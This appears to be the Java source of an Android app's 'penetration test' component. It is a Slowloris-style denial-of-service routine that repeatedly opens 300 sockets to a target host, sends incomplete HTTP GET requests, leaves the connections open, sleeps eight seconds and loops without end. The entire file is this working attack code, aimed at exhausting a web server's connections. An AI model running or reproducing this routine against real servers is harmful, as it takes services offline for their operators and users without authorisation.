package ch.abertschi.loris;

import android.os.Handler;
import android.os.Message;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

/**
 * Created by abertschi on 26.11.16.
 */
public class PenetrationTestRunnable implements Runnable {

    private String host;
    private int port;
    private Handler handler;

    public PenetrationTestRunnable(String host, int port, Handler handler) {
        this.host = host;
        this.port = port;
        this.handler = handler;
    }

    @Override
    public void run() {
        int run = 1;
        try {
            while (!Thread.currentThread().isInterrupted()) {
                for (int i = 0; i < 300; i++) {
                    tell(String.format("Creating socket %d (%d)", i, run));
                    request(host, port);
                }
                tell("Sleeping after iteration " + run);
                Thread.sleep(8000);
                run++;
            }

        } catch (InterruptedException e) {
            tell(e.getMessage());
            e.printStackTrace();
        }

    }

    private void tell(String msg) {
        Message m = Message.obtain();
        m.obj = msg;
        System.out.println(msg);
        handler.sendMessage(m);
    }

    private static void request(String ip, int port) {
        Socket socket = null;
        try {
            socket = new Socket(InetAddress.getByName(ip), port);
//            socket.setSoTimeout(10);
            PrintWriter writer = new PrintWriter(socket.getOutputStream());
            writer.println("GET /?100 HTTP/1.1");
            writer.println(String.format("Host: %s", ip));
            writer.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
